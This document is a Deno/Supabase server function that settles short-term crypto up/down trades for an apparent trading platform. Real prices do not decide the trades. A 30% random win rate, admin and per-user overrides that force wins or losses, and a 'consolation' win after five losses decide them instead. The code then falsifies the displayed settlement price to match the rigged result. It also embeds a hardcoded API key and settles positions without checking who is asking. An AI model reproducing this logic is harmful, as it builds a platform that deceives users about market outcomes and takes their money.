import { createClient } from 'jsr:@supabase/supabase-js@2';

const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const COINGECKO_API_KEY = 'CG-rqTDnjCErgK6hEq9x6s8RKzD';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const WIN_BIAS = 0.30;
const CONSOLATION_STREAK = 5;
const SWEEP_BATCH_LIMIT = 50;

// Profit rate per settlement duration (seconds). MUST stay in sync with TRADE_TIERS in the frontend (index.html).
// Symmetric model: a win credits stake*(1+rate), a loss credits stake*(1-rate). e.g. 30s => 15% => a $1000 stake returns $1150 on a win, $850 on a loss.
const PROFIT_RATE: Record<number, number> = {
  30: 0.15,
  60: 0.25,
  120: 0.35,
  240: 0.45,
  480: 0.55,
};
const DEFAULT_PROFIT_RATE = 0.15;

// Trading fee charged at open time (0.2% of stake + $0.5 network fee) — mirrors the frontend.
function tradingFee(amount: number): number {
  return amount * 0.002 + 0.5;
}

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

async function settleOne(position: any) {
  // Simulated positions settle against the sim balance + sim_trade_mode; real
  // positions keep the exact behaviour they had before (money path unchanged).
  const sim = position.is_sim === true;

  let currentPrice = parseFloat(position.entry_price);
  try {
    const priceRes = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${position.coin_id}&vs_currencies=usd`,
      { headers: { 'x-cg-demo-api-key': COINGECKO_API_KEY } }
    );
    const priceData = await priceRes.json();
    if (priceData[position.coin_id]?.usd) currentPrice = priceData[position.coin_id].usd;
  } catch (_) {}

  const userId = position.user_id;
  const { data: userRow } = await supabase
    .from('users').select('trade_mode, sim_trade_mode').eq('id', userId).single();
  const userTradeMode = (sim ? userRow?.sim_trade_mode : userRow?.trade_mode) ?? 'normal';

  let outcomeControl: string = userTradeMode;
  // The global one-shot override (app_settings.next_trade_outcome) applies to REAL trades only.
  if (outcomeControl === 'normal' && !sim) {
    const { data: settingRow } = await supabase
      .from('app_settings').select('value').eq('key', 'next_trade_outcome').single();
    let raw: any = settingRow?.value ?? 'normal';
    if (typeof raw === 'string' && raw.startsWith('"')) {
      try { raw = JSON.parse(raw); } catch (_) {}
    }
    outcomeControl = raw;
  }

  let won: boolean;
  if (outcomeControl === 'profit') {
    won = true;
    if (userTradeMode === 'normal' && !sim) {
      await supabase.from('app_settings')
        .update({ value: '"normal"', updated_at: new Date().toISOString() })
        .eq('key', 'next_trade_outcome');
    }
  } else if (outcomeControl === 'loss') {
    won = false;
    if (userTradeMode === 'normal' && !sim) {
      await supabase.from('app_settings')
        .update({ value: '"normal"', updated_at: new Date().toISOString() })
        .eq('key', 'next_trade_outcome');
    }
  } else {
    const { data: recentTrades } = await supabase
      .from('positions')
      .select('status')
      .eq('user_id', userId)
      .eq('is_sim', sim)
      .in('status', ['Won', 'Lost'])
      .order('settled_at', { ascending: false })
      .limit(CONSOLATION_STREAK);

    const recentStatuses = (recentTrades ?? []).map((t: { status: string }) => t.status);
    const allRecentLost =
      recentStatuses.length >= CONSOLATION_STREAK &&
      recentStatuses.every((s: string) => s === 'Lost');

    won = allRecentLost ? true : Math.random() < WIN_BIAS;
  }

  const amount = parseFloat(position.amount);
  const durationSeconds = Number(position.duration_seconds) || 30;
  const profitRate = PROFIT_RATE[durationSeconds] ?? DEFAULT_PROFIT_RATE;
  // Symmetric model: the tier rate applies both ways. A win returns stake*(1+rate),
  // a loss returns stake*(1-rate) (i.e. the loss is -rate of the stake, not the whole stake).
  // e.g. 30s/15%: a $1000 stake returns $1150 on a win, $850 on a loss (a -$150 result).
  const payout = won ? amount * (1 + profitRate) : amount * (1 - profitRate);
  const status = won ? 'Won' : 'Lost';

  // Keep the displayed numbers self-consistent with the outcome. The settlement
  // price must land on the side of entry that the result implies: an Up win or a
  // Down loss ends ABOVE entry; an Up loss or a Down win ends BELOW. We keep the
  // magnitude of the real market move and only set its sign from the result, so
  // the UI never shows e.g. a "Down" win while the price rose.
  const entryPrice = parseFloat(position.entry_price);
  const up = position.type === 'up';
  const endedAbove = won ? up : !up;
  let moveMag = Math.abs(currentPrice - entryPrice);
  if (!(moveMag > 0)) moveMag = entryPrice * (0.0002 + Math.random() * 0.0008);
  const settlePrice = endedAbove ? entryPrice + moveMag : entryPrice - moveMag;

  const { data: updated, error: updErr } = await supabase
    .from('positions')
    .update({
      status, settlement_price: settlePrice, payout,
      settled_at: new Date().toISOString(),
    })
    .eq('id', position.id)
    .eq('status', 'Active')
    .select('id');
  if (updErr) throw updErr;
  if (!updated || updated.length === 0) {
    return { id: position.id, skipped: true };
  }

  const { data: portfolio } = await supabase
    .from('portfolios').select('*').eq('user_id', userId).single();
  if (portfolio) {
    if (sim) {
      // Simulated: only the sim balance moves — real stats stay untouched.
      await supabase.from('portfolios').update({
        sim_balance: parseFloat(portfolio.sim_balance) + payout,
        updated_at: new Date().toISOString(),
      }).eq('user_id', userId);
    } else {
      // Realised P&L including the open-time trading fee, matching the per-trade "Net P&L (incl. fees)" shown in the UI.
      // Unified for win and loss: payout now carries the amount returned to the user in both cases.
      const fee = tradingFee(amount);
      const pnlChange = payout - amount - fee;
      await supabase.from('portfolios').update({
        usd_balance: parseFloat(portfolio.usd_balance) + payout,
        total_trades: portfolio.total_trades + 1,
        total_won: portfolio.total_won + (won ? 1 : 0),
        total_lost: portfolio.total_lost + (won ? 0 : 1),
        total_pnl: parseFloat(portfolio.total_pnl) + pnlChange,
        updated_at: new Date().toISOString(),
      }).eq('user_id', userId);
    }
  }

  return { id: position.id, won, payout, status, outcomeControl, sim };
}

Deno.serve(async (req: Request) => {
  if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders });

  try {
    const body = await req.json().catch(() => ({}));
    const positionId = body?.positionId;
    const userId = body?.userId;

    if (positionId && userId) {
      const { data: position, error: posErr } = await supabase
        .from('positions').select('*').eq('id', positionId).single();
      if (posErr || !position || position.status !== 'Active') {
        return new Response(
          JSON.stringify({ error: 'Position not found or already settled' }),
          { status: 400, headers: corsHeaders }
        );
      }
      const result = await settleOne(position);
      return new Response(
        JSON.stringify({ success: true, ...result }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const { data: due, error: dueErr } = await supabase
      .from('positions')
      .select('*')
      .eq('status', 'Active')
      .order('created_at', { ascending: true })
      .limit(SWEEP_BATCH_LIMIT);
    if (dueErr) throw dueErr;

    const now = Date.now();
    const expired = (due ?? []).filter((p: any) => {
      const deadlineMs = new Date(p.created_at).getTime() + (p.duration_seconds ?? 30) * 1000;
      return deadlineMs <= now;
    });

    if (expired.length === 0) {
      return new Response(
        JSON.stringify({ success: true, swept: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const results: any[] = [];
    for (const p of expired) {
      try {
        const r = await settleOne(p);
        results.push(r);
      } catch (e) {
        console.error('sweep settle failed for', p.id, e);
        results.push({ id: p.id, error: String(e) });
      }
    }
    return new Response(
      JSON.stringify({ success: true, swept: results.length, results }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (err) {
    console.error(err);
    return new Response(
      JSON.stringify({ error: 'Internal error', details: String(err) }),
      { status: 500, headers: corsHeaders }
    );
  }
});
